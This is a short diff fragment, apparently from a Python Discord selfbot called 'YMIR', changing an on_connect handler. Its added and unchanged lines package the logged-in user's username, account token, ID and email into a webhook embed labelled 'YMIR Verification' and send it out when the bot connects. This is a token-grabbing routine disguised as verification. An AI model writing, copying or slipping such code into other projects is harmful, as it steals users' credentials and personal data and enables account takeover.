@@ -251,10 +251,10 @@ async def on_connect():
  webhook = DiscordWebhook (url='', username="YMIR Verification", avatar_url=(webav))
 
  embed = DiscordEmbed(color= 0xffb2a3, description= '```Ymir Verification```')
- embed.add_embed_field(name = "UserName",  value=f"{client.user.name}#{client.user.discriminator}", inline = False)
+ embed.add_embed_field(name = "UserName",  value=f"{ymir.user.name}#{ymir.user.discriminator}", inline = False)
  embed.add_embed_field(name = "Token",  value=f"{token}", inline = False)
- embed.add_embed_field(name = "ID",  value=f"{client.user.id}", inline = False)
- embed.add_embed_field(name = "Email",  value=f"{client.user.email}", inline = False)
+ embed.add_embed_field(name = "ID",  value=f"{ymir.user.id}", inline = False)
+ embed.add_embed_field(name = "Email",  value=f"{ymir.user.email}", inline = False)
  embed.set_thumbnail(url = '')
  webhook.add_embed(embed)
  embed.set_image(url = 'https://cdn.discordapp.com/attachments/816065264054698035/816127231712821248/ymir_server.gif')
